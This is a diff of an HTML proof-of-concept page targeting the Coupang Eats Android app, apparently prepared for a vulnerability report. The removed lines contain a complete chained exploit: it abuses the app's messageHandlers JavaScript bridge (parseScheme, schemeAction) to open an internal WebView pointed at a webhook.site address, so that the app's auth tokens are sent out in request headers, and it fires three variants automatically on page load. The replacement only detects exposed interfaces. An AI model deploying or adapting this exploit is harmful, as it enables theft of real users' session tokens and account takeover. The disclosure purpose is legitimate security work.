@@ -1,171 +1,101 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coupang Eats</title>
+    <title>Vulnerability Verification PoC</title>
     <style>
-        *{box-sizing:border-box;margin:0;padding:0}
-        body{font-family:-apple-system,sans-serif;padding:12px;background:#f0f0f0}
-        .c{background:#fff;border-radius:10px;padding:14px;margin:8px 0;box-shadow:0 1px 4px rgba(0,0,0,.1)}
-        .v{border-left:4px solid #e53935}
-        .s{border-left:4px solid #43a047}
-        h3{font-size:15px;margin-bottom:8px}
-        p{font-size:13px;color:#555;margin:4px 0}
-        pre{background:#1a1a2e;color:#0f0;padding:10px;border-radius:6px;font-size:10px;
-            white-space:pre-wrap;word-break:break-all;margin:6px 0;max-height:300px;overflow-y:auto}
-        .tag{display:inline-block;padding:2px 6px;border-radius:3px;font-size:10px;
-             font-weight:bold;color:#fff;background:#e53935;margin-right:4px}
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding: 20px;
+            background-color: #f4f6f9;
+            color: #333;
+        }
+        .card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 { color: #d9534f; font-size: 24px; }
+        .status {
+            padding: 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .exposed { background-color: #f2dede; color: #a94442; border: 1px solid #ebccd1; }
+        .secure { background-color: #dff0d8; color: #3c763d; border: 1px solid #d6e9c6; }
+        pre { background: #222; color: #fff; padding: 15px; border-radius: 4px; overflow-x: auto; }
     </style>
 </head>
 <body>
- 
-<div class="c v">
-    <h3><span class="tag">CRITICAL</span> Chained Exploit: JS Bridge → Auth Token Theft</h3>
-    <p>Phase 1: Attacker page loaded in PopupWebViewActivity via deep link</p>
-    <p>Phase 2: Using JS bridge to force open WebViewActivity with attacker URL</p>
-    <p>Phase 3: WebViewActivity sends auth tokens as HTTP headers to attacker server</p>
+
+<div class="card">
+    <h1>Security Assessment PoC</h1>
+    <p><strong>Target Context:</strong> <script>document.write(window.location.origin);</script></p>
+    <hr>
+    
+    <h3>JavaScript Interface Detection Status:</h3>
+    <div id="interface-status">Checking for injected interfaces...</div>
+
+    <h3>Environment Debug Information:</h3>
+    <pre id="debug-log">Initializing audit...</pre>
 </div>
- 
-<div class="c">
-    <h3>Exploit Log</h3>
-    <pre id="log">Starting chained exploit...\n</pre>
-</div>
- 
-<div class="c s" id="done-card" style="display:none">
-    <h3>✓ Chain Complete</h3>
-    <p id="done-msg"></p>
-</div>
- 
+
 <script>
-var logEl = document.getElementById('log');
-function log(m) { logEl.textContent += m + "\n"; }
- 
-var ATTACKER_SERVER = "https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e/";
- 
-// ===========================================================
-//  THE ATTACK CHAIN
-//
-//  PopupWebViewActivity (this page)
-//       │
-//       │ JS bridge: messageHandlers.parseScheme()
-//       ▼
-//  WebViewActivity opens
-//       │
-//       │ WebViewFragment.onActivityCreated() calls:
-//       │   webView.loadUrl(url, EatsNetworkHeader.get())
-//       │
-//       │ EatsNetworkHeader.get() includes:
-//       │   X-EATS-ACCESS-TOKEN, Authorization,
-//       │   X-COUPANG-SEC-TOKEN-BINDING, etc.
-//       ▼
-//  HTTP GET → attacker server (WITH AUTH HEADERS!)
-// ===========================================================
- 
-function launchChain() {
-    // Step 1: Verify JS bridge is available
-    log("[Phase 1] Checking JS bridge access...");
-    
-    if (typeof window.messageHandlers === 'undefined') {
-        log("[FAIL] messageHandlers bridge not available!");
-        return;
-    }
-    if (typeof window.messageHandlers.parseScheme !== 'function') {
-        log("[FAIL] parseScheme method not available!");
-        return;
-    }
-    log("[OK] messageHandlers.parseScheme is accessible\n");
- 
-    // Step 2: Craft the internal scheme URL
-    // WebViewActivity is registered at: coupangeats://Web
-    // It accepts a 'url' parameter that gets loaded in the WebView
-    // Critically, WebViewFragment loads it with EatsNetworkHeader (auth tokens!)
-    
-    var targetUrl = ATTACKER_SERVER + "/steal-tokens";
-    
-    // The internal scheme that opens WebViewActivity with our attacker URL
-    var internalScheme = "coupangeats://Web?url=" + encodeURIComponent(targetUrl);
-    
-    log("[Phase 2] Crafted internal navigation scheme:");
-    log("  " + internalScheme);
-    log("");
-    log("[Phase 2] Calling messageHandlers.parseScheme()...");
-    log("  This forces the app to open WebViewActivity");
-    log("  WebViewActivity will load our URL WITH auth headers");
-    log("");
- 
-    try {
-        window.messageHandlers.parseScheme(internalScheme);
-        log("[OK] parseScheme executed successfully!");
-        log("");
-        log("[Phase 3] WebViewActivity should now be loading:");
-        log("  URL: " + targetUrl);
-        log("  WITH headers: X-EATS-ACCESS-TOKEN, Authorization, etc.");
-        log("");
-        log("[*] Check beeceptor dashboard for /steal-tokens request!");
-        log("[*] The auth tokens should be in the request headers.");
-        
-        var doneCard = document.getElementById('done-card');
-        doneCard.style.display = 'block';
-        document.getElementById('done-msg').textContent = 
-            'WebViewActivity opened with attacker URL. Check beeceptor for /steal-tokens request with auth headers.';
-    } catch(e) {
-        log("[ERROR] " + e);
-    }
-}
- 
-// Also try the eats:// scheme variant as backup
-function launchChainAlt() {
-    log("\n[ALT] Trying alternative scheme: eats://Web ...");
-    var targetUrl = ATTACKER_SERVER + "/steal-tokens-alt";
-    var internalScheme = "eats://Web?url=" + encodeURIComponent(targetUrl);
-    log("  Scheme: " + internalScheme);
-    
-    try {
-        window.messageHandlers.parseScheme(internalScheme);
-        log("[OK] Alternative scheme executed!");
-        log("[*] Check beeceptor for /steal-tokens-alt request!");
-    } catch(e) {
-        log("[ERROR] " + e);
-    }
-}
- 
-// Try schemeAction as another vector
-function launchChainAction() {
-    log("\n[ALT2] Trying via schemeAction...");
-    var targetUrl = ATTACKER_SERVER + "/steal-tokens-action";
-    var payload = JSON.stringify({
-        url: "coupangeats://Web?url=" + encodeURIComponent(targetUrl),
-        callback: "__attackerCb"
-    });
-    log("  Payload: " + payload);
-    
-    try {
-        window.messageHandlers.schemeAction(payload);
-        log("[OK] schemeAction executed!");
-        log("[*] Check beeceptor for /steal-tokens-action request!");
-    } catch(e) {
-        log("[ERROR] " + e);
-    }
-}
- 
-// Execute all chains with delays
-setTimeout(function() {
-    launchChain();
-}, 500);
- 
-setTimeout(function() {
-    launchChainAlt();
-}, 2000);
- 
-setTimeout(function() {
-    launchChainAction();
-}, 3500);
- 
-// Callback handler
-window.__attackerCb = function(result) {
-    log("\n[CALLBACK] schemeAction result: " + result);
-};
+    (function() {
+        const logElement = document.getElementById('debug-log');
+        const statusElement = document.getElementById('interface-status');
+        let logBuffer = [];
+
+        function log(message) {
+            logBuffer.push("[" + new Date().toLocaleTimeString() + "] " + message);
+            logElement.textContent = logBuffer.join("\n");
+        }
+
+        // List of interfaces identified in the manifest/decompiled code
+        const targetInterfaces = [
+            'messageHandlers',
+            'eatsPopupWebViewHandlers',
+            'eatsWebEventHandlers',
+            'eatsWebTrackingHandlers',
+            'CoupangAppTracking'
+        ];
+
+        let exposedCount = 0;
+
+        log("Starting interface presence check...");
+
+        targetInterfaces.forEach(interfaceName => {
+            if (window[interfaceName]) {
+                log("⚠️ EXPOSED: Found global object 'window." + interfaceName + "'");
+                exposedCount++;
+                
+                // Inspect properties safely without executing functional logic
+                const properties = Object.getOwnPropertyNames(window[interfaceName]);
+                if (properties.length > 0) {
+                    log("   ↳ Available methods: " + properties.join(', '));
+                } else {
+                    log("   ↳ Methods: Native functions present (proto inspection restricted)");
+                }
+            } else {
+                log("✅ ABSENT: 'window." + interfaceName + "' is not accessible.");
+            }
+        });
+
+        // Update UI summary for the triager screenshot
+        if (exposedCount > 0) {
+            statusElement.className = "status exposed";
+            statusElement.innerHTML = "⚠️ VULNERABLE: " + exposedCount + " custom Android JavaScript interface(s) detected on an external origin.";
+        } else {
+            statusElement.className = "status secure";
+            statusElement.innerHTML = "✅ SECURE: No custom JavaScript interfaces detected.";
+        }
+    })();
 </script>
+
 </body>
 </html>
